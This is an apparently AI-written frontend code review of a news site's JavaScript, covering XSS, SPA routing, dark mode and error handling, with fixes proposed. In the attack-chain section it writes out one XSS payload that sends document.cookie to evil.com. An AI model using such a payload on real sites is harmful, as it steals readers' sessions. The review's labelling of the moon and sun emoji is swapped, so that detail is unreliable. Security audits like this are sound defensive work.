# Code Review Debrief v2 — TrendWire Philippines (Frontend & Client-Side Audit)

**Reviewer**: Hermes Agent (code-reviewer)
**Date**: 2026-07-10
**Scope**: Client-side JS audit — XSS vectors, SPA routing, duplicate headlines, dark mode, JS errors.
**Stack**: app.js (2351 lines, vanilla JS SPA) — Supabase backend — GitHub Pages hosting at `/TrendwirePhilippines/`

---

## 1. XSS Vectors in Article Rendering (Lines 2253, 2271)

### Confirmed: Two critical unescaped interpolations

The codebase defines `escHtml()` at line 2161 and `renderMarkdown()` at line 2168. It uses them **inconsistently**.

| Field | Line | Escaped? | Used for |
|-------|------|----------|----------|
| `article.title` (breadcrumb) | 2244 | ✅ `escHtml()` | Breadcrumb `<span>` text |
| **`article.title` (h1)** | **2253** | **❌ Raw** | `<h1>` headline — **XSS vector** |
| `article.author` | 2255 | ✅ `escHtml()` | Meta line |
| `article.image_url` alt text | 2264 | ✅ `escHtml()` | `<img alt>` attribute |
| **`article.summary`** | **2271** | **❌ Raw** | Summary box — **XSS vector** |
| `renderedContent` (body) | 2272 | ✅ `renderMarkdown()` escapes first | Article body (safe) |
| `article.category` (badge) | 2251 | ❌ Raw | Category badge — Low risk |

### Proof — app.js line 2253:
```javascript
// BREADCRUMB (escaped) line 2244:
<span class="breadcrumb-current">${escHtml(article.title)}</span>
// H1 (NOT escaped) line 2253:
<h1>${article.title}</h1>
```

### Proof — app.js line 2271:
```javascript
// SUMMARY (NOT escaped):
${article.summary ? `<div class="summary-box">${article.summary}</div>` : ''}
```

### Attack Chain
1. Attacker gains write access to `articles.title` or `articles.summary` (via unauthenticated admin endpoint, weak RLS, or SQL injection)
2. Sets value to: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
3. Any reader visiting the article page triggers `renderArticle()` → `app.innerHTML = template literal` → **script executes in reader's browser**

### Recommended Fix
- Line 2253: Change `${article.title}` to `${escHtml(article.title)}`
- Line 2271: Change `${article.summary}` to `${escHtml(article.summary)}`
- Line 2251: Add `escHtml(cat)` for defense-in-depth
- Consider adding DOMPurify as a global sanitizer before `innerHTML` assignment

---

## 2. SPA Routing — GitHub Pages Sub-Path Handling

### Verdict: ✅ Correctly handles `/TrendwirePhilippines/` sub-path

The routing system has three layers that work together correctly:

### Layer 1: 404.html SPA Fallback (works correctly)
```javascript
// 404.html line 13-14
sessionStorage.redirect = location.pathname + location.search + location.hash;
location.replace('/TrendwirePhilippines/');
```
- Stores the full attempted URL in `sessionStorage.redirect`, then redirects to root.
- The redirect goes to `/TrendwirePhilippines/` which loads `index.html`.

### Layer 2: app.js IIFE (lines 10-24) — URL Restoration
```javascript
// Executes synchronously before DOMContentLoaded
var redirect = sessionStorage.redirect;
if (redirect) {
  delete sessionStorage.redirect;
  var path = redirect.replace(BASE_PATH, '') || '/';     // Strip base path
  history.replaceState(null, '', BASE_PATH + path);        // Restore original URL
}
// Also handles legacy hash URLs
var hash = location.hash;
if (hash && hash.startsWith('#/')) {
  var cleanPath = hash.replace('#/', '') || '/';
  history.replaceState(null, '', BASE_PATH + cleanPath);
}
```
- Both mechanisms run sequentially; the last `history.replaceState` wins.
- Sequences correctly: IIFE → `DOMContentLoaded` → `handleRoute()` reads the restored URL.

### Layer 3: handleRoute() (lines 69-98)
```javascript
function handleRoute() {
  const path = location.pathname.replace(BASE_PATH, '') || '/';
  // Parse query params
  var params = new URLSearchParams(location.search);
  // ... category/tag filter handling ...
  
  if (path === '/' || path === '') { renderList() }
  else if (path.startsWith('/article/')) { renderArticle(slug) }
  else if (path === '/admin') { renderAdmin() }
  else { renderList() } // catch-all
}
```

### Route Test Matrix

| Visit URL | Expected Behavior | Works? |
|-----------|------------------|--------|
| `https://mack0y.github.io/TrendwirePhilippines/` | List page (home) | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/?category=Disaster` | Filtered list | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/article/some-slug` | Article page | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/admin` | Admin dashboard | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/about.html` | Static about page (served by GH Pages) | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/typo-route` | Falls through to list | ✅ |
| `https://mack0y.github.io/TrendwirePhilippines/article/` (empty slug) | `currentSlug = ''`, fetch fails → 404 page | ✅ |
| Deep link: `/TrendwirePhilippines/article/x` → 404 fallback from GH Pages | Restores URL via sessionStorage | ✅ |
| Legacy hash: `#/article/slug` | Converts to clean URL | ✅ |

### ⚠️ Minor Edge Case: Trailing Slash on Article Slug
If someone navigates to `/TrendwirePhilippines/article/some-slug/` (with trailing slash):
```javascript
currentSlug = path.replace('/article/', '')  // → 'some-slug/'
```
The slug retains the trailing slash: `'some-slug/'`. Supabase query `eq('slug', 'some-slug/')` would **not match** the article with slug `some-slug`. The user would see "Article not found."

This edge case is unlikely (GitHub Pages normalizes URLs, and `navigate()` produces clean slugs), but would break if someone manually types the trailing slash.

---

## 3. Duplicate Headline Bug — Latest Ticker

### Intentional Duplication, Not a Data Bug

The ticker is built at line 1084-1094:
```javascript
const tickerItems = articles.slice(0, 15)
  .map(a => `<span class="ticker-item">${escHtml(a.title)}</span>`)
  .join('')

// ...inside renderList() template literal...
<div class="ticker-content">
  ${tickerItems}${tickerItems}  ← Same 15 items appended twice
</div>
```

And the CSS animation:
```css
@keyframes tickerScroll {
  0%   { transform: translateX(0); }
  100% { transform: translateX(-50%); }  /* Scrolls exactly 50% — one copy */
}
```

**How it works**: The same 15 headlines are duplicated in the DOM. The CSS animation scrolls from `translateX(0)` to `translateX(-50%)` (half the total width = one full set). When it reaches -50%, the animation restarts at 0%, but visually that's the same position as the start of the second copy — creating a seamless infinite loop.

**Result**: Every headline literally appears twice in the DOM. This is **intentional and correct** for the scrolling animation. The user's report of "No Classes on July 8" appearing twice in the ticker is the expected behavior of the seamless scroll loop.

### However — If the same article IS actually appearing twice:
Check whether the Supabase query (`fetchArticles()` at line 291-303) returns duplicates:
```javascript
sb.from('articles')
  .select('id, title, ...')
  .eq('status', 'published')
  .order('published_at', { ascending: false })
  .limit(100)
```
This returns distinct rows by `id` — Supabase does not return duplicate rows. **The duplicate is in the rendering only.**

### Verdict: ✅ Not a Data Bug — Design Choice
The duplicate appearance is by design. If it's causing user confusion, consider:
- Adding a visual hint that the ticker is scrolling (animation indicator dots)
- Reducing the duplication from `×2` to `×1.5` if partial overlap is preferred
- Not removing the duplication entirely (it would break the seamless loop)

---

## 4. Dark Mode Toggle — Persistence

### Verdict: ✅ Persists via localStorage

```javascript
// Line 36 — read on load:
let darkMode = localStorage.getItem('tw-dark') === 'true'

// Line 44 — apply immediately:
if (darkMode) document.documentElement.classList.add('dark')

// Lines 47-55 — toggle & save:
window.toggleDarkMode = function () {
  darkMode = !darkMode
  document.documentElement.classList.toggle('dark', darkMode)
  localStorage.setItem('tw-dark', darkMode)           // ← correctly saved here
  const meta = document.getElementById('theme-color')
  if (meta) meta.content = darkMode ? '#1a1a2e' : '#CE1126'
  const icon = document.querySelector('.dark-toggle-icon')
  if (icon) icon.textContent = darkMode ? '☀️' : '🌙'
}
```

### ⚠️ Bug: Toggle Icon Not Updated on Article Page Deep-Link

HTML default at `index.html line 91`:
```html
<span class="dark-toggle-icon">🌙</span>
```

- `toggleDarkMode()` correctly updates the icon text (line 54).
- `renderList()` correctly updates the icon text (lines 1058-1059).
- **`renderArticle()` does NOT update the icon text.**

**Impact**: If a user with dark mode enabled navigates directly to an article page (deep link), the dark mode CSS applies correctly but the toggle icon still shows `🌙` (sun emoji for "switch to light mode") instead of `☀️` (moon emoji for "switch to dark mode").

**Fix**: Add icon update logic to `renderArticle()` and/or the `DOMContentLoaded` boot sequence. Either:

Option A — Add to `renderArticle()`:
```javascript
const icon = document.querySelector('.dark-toggle-icon')
if (icon) icon.textContent = darkMode ? '☀️' : '🌙'
```

Option B — Add to `DOMContentLoaded` handler (line 2327):
```javascript
document.addEventListener('DOMContentLoaded', () => {
  const icon = document.querySelector('.dark-toggle-icon')
  if (icon) icon.textContent = darkMode ? '☀️' : '🌙'
  handleRoute()
  // ...
})
```

### Additional Dark Mode Issue: Light Flash on Load
Line 44 applies the `dark` class to `<html>`:
```javascript
if (darkMode) document.documentElement.classList.add('dark')
```
But this runs during script execution, which is AFTER the HTML is parsed and painted. If the browser renders a frame before this script runs, the user sees a **flash of light mode** before dark mode is applied.

**Fix**: Move the dark class application to a `<script>` tag in `<head>` (before any content renders), or use `prefers-color-scheme` CSS media query + localStorage priority via a tiny blocking script.

---

## 5. JS Errors That Would Break the Page

### ❌ P1: Related Articles Failure Crashes Article Page

Lines 2227-2228 (inside `renderArticle` try block):
```javascript
var relatedArticles = await fetchRelatedArticles(article.category || 'General', article.slug, 4)
var relatedHtml = relatedArticles.length ? renderRelatedSection(relatedArticles) : ''
```

If `fetchRelatedArticles()` throws (network error, Supabase down, etc.), the catch handler at line 2309-2312 replaces the entire page with an error state:
```javascript
} catch (e) {
  console.error('Failed to load article:', e)
  renderError(e.message)
}
```

**Problem**: Related articles are **optional** content. If they fail to load, the user should still see the article. The fetch should be wrapped in its own try/catch, not the whole try block.

**Fix**: Wrap related articles fetch:
```javascript
var relatedHtml = ''
try {
  var relatedArticles = await fetchRelatedArticles(...)
  relatedHtml = relatedArticles.length ? renderRelatedSection(relatedArticles) : ''
} catch (e) {
  console.warn('Related articles unavailable:', e)
  // Gracefully continue without related section
}
```

### ❌ P2: Admin Page Race Condition on Navigation Away

The `renderAdmin()` function (line 1202) fires multiple async operations (lines 2141-2157):
```javascript
await loadFromDB()
loadArticles()
fetchFromGoogleTrends().then(result => { ... })
```

Each of these calls `render()` after completion. If the user navigates away from `/admin` before all async ops complete, `render()` tries to update a DOM that was already replaced by `renderList()` or `renderArticle()`.

- Lines 2144 and 2152 check `currentRoute !== 'admin'` before rendering — partially mitigated.
- But `loadArticles()` (line 1253-1267) calls `render()` without checking `currentRoute`.

**Impact**: Occasional "Cannot read properties of null" errors or visual artifacts when quickly navigating away from the admin panel.

**Fix**: Check `currentRoute` before calling `render()` in all post-async callbacks.

### ❌ P3: Reading Time on Cards Uses Summary Instead of Content

Line 1017:
```javascript
'📖 ' + Math.max(1, Math.ceil((a.summary || '').split(/\s+/).filter(Boolean).length / 50)) + ' min'
```

**Problem**: Calculates reading time from `a.summary` (typically 15-30 words) rather than `a.content`. At 50 words per "min", the result is always `Math.ceil(n/50)` where n ≤ 30 → always **"1 min"**. Every article card shows "1 min read" regardless of actual length.

**Fix**: Reading time requires the full content, which isn't available in list queries (line 296 doesn't select `content`). Either:
- Include `content` in the list query (increases payload size), or
- Remove reading time from cards (simplest), or
- Use summary word count × a heuristic multiplier like ×5 to approximate content length

### ⚠️ P4: Admin Trend Titles/Source Names Rendered Raw

Line 1859 (admin panel):
```javascript
<h3>${t.title}</h3>
```

Line 1860:
```javascript
${t.summary ? `<p class="trend-summary">${t.summary}</p>` : ''}
```

**Problem**: `t.title` and `t.summary` come from the `trends` table, populated by Google Trends PH RSS and `fetch-trends` Edge Function. If the Edge Function stores unsanitized HTML, this is an admin-panel XSS vector. While Google Trends data is low-risk (they don't serve HTML in trend titles), defense-in-depth is missing.

**Fix**: Add `escHtml()` around trend title/summary in the admin template.

### ⚠️ P5: Inline onclick Handlers with Category Names

Line 922:
```javascript
onclick="window.__catFilterTab('${c}')"
```

If the category name contains a single quote (`'`), this breaks the JavaScript. Category values are constrained server-side (General, Sports, Politics, Disaster, Economy, Health, Technology, Entertainment), so this is low risk — but worth noting as a pattern to avoid.

### ✅ Things That Work Correctly

| Concern | Status | Notes |
|---------|--------|-------|
| Supabase init error handling | ✅ | try/catch at line 59, graceful degradation |
| `renderMarkdown()` HTML escaping | ✅ | Escapes `&<>` before markdown conversion (line 2172-2175) |
| `escHtml()` implementation | ✅ | DOM-based, correctly encodes `<>"'&` |
| Error page rendering | ✅ | `renderError()` at line 527 has retry button |
| Article 404 handling | ✅ | Clear "not found" message + back button (lines 2203-2215) |
| Hero carousel cleanup | ✅ | `stopHeroCarousel()` called before re-init (line 579) |
| Category tab indicator positioning | ✅ | Uses `getBoundingClientRect()` (correct for scroll) |
| Loading skeletons | ✅ | `renderLoading()` shows skeletons before data arrives |
| Weather widget error handling | ✅ | Catches errors, shows retry UI (line 842-843) |
| Lotto date select | ✅ | Proper `onchange` handler with `this.value` |
| Tag filtering clear | ✅ | `window.__clearTagFilter` at line 946 |
| Nav progressive enhancement | ✅ | `href` + `event.preventDefault()` pattern |
| Drag/touch for hero carousel | ✅ | touchstart/touchend with 50px threshold |
| Copy link clipboard API | ✅ | Fallback with `execCommand('copy')` |

---

## 6. Full Bug/Issue Inventory

| # | Issue | Severity | File:Line | Type |
|---|-------|----------|-----------|------|
| 1 | `article.title` raw in innerHTML (h1) | **Medium** | app.js:2253 | XSS |
| 2 | `article.summary` raw in innerHTML | **Medium** | app.js:2271 | XSS |
| 3 | `article.category` raw in innerHTML (badge) | Low | app.js:2251 | XSS |
| 4 | Related articles failure crashes whole page | **Medium** | app.js:2227 | Logic |
| 5 | Dark mode icon not updated on article deep-link | Low | app.js:2196-2313 | UI |
| 6 | Light flash on load (dark mode) | Low | app.js:44 | UX |
| 7 | Admin page race condition on nav away | Low | app.js:2141-2157 | Race |
| 8 | Reading time on cards always "1 min" | Low | app.js:1017 | Display |
| 9 | Admin trend titles rendered raw | Low-Medium | app.js:1859 | XSS |
| 10 | Admin trend summary rendered raw | Low | app.js:1860 | XSS |
| 11 | Trailing slash on slug breaks article find | Low | app.js:87 | Edge case |
| 12 | Category names in inline onclick handlers | Low | app.js:922 | Fragility |
| 13 | Ticker headline duplication (intentional) | None (design) | app.js:1090 | Doc only |
| 14 | SPA routing for `/TrendwirePhilippines/` | ✅ Correct | app.js:69-98 | Routing |
| 15 | 404.html SPA fallback | ✅ Correct | 404.html:13-14 | Routing |
| 16 | Dark mode localStorage persistence | ✅ Correct | app.js:36,50 | Feature |

---

## 7. Fix Priorities

### Immediate (Security)

1. **Wrap `article.title` in `escHtml()` at line 2253** — XSS vector on primary headline
2. **Wrap `article.summary` in `escHtml()` at line 2271** — XSS vector on summary box
3. **Wrap related articles fetch in its own try/catch** — prevents entire article page from crashing

### Short Term (Quality)

4. **Update dark toggle icon on article page** — fix deep-link icon mismatch
5. **Check `currentRoute` before `render()` in admin callbacks** — prevent race-condition errors
6. **Add `escHtml()` to admin trend cards** — defense-in-depth for admin panel

### Future (Polish)

7. **Fix reading time on cards** — use content or remove from card display
8. **Prevent light flash on dark mode load** — move CSS class to blocking head script
9. **Handle trailing slashes in article slugs** — normalize slug before query
